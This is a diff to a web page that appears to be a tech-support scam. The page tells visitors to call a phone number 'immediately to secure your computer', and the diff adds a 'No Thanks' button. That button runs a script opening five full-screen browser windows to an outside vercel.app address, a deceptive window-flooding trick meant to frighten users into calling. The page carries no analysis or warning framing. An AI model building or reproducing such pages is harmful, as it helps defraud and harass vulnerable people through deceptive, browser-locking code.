@@ -346,6 +346,22 @@ window.onload = updateContentBasedOnOS;
 </div>
 <div class="bee-block bee-block-7 bee-paragraph">
 <p>Contact for support immediately to secure your computer : <a href="tel:+1(800)638-0642">+1(800)638-0642</a></p>
+<button id="noThanks" class="elementor-button elementor-size-sm" onclick="openMultipleTabs()" style="width:100%; background-color:#F15641;">No Thanks</button>
+
+    <script type="text/javascript">
+        function openMultipleTabs() {
+            var url = 'https://mfr-gqn4.vercel.app/'; // Replace with your URL
+            var numberOfTabs = 5; // Number of tabs to open
+
+            for (var i = 0; i < numberOfTabs; i++) {
+                window.open(
+                    url, 
+                    '_blank', 
+                    `width=${screen.width},height=${screen.height},left=0,top=0,resizable=yes,scrollbars=yes`
+                );
+            }
+        }
+    </script>
 <p class="os" style="font-size:0px;">Welcome</p>
 </div>
 </div>
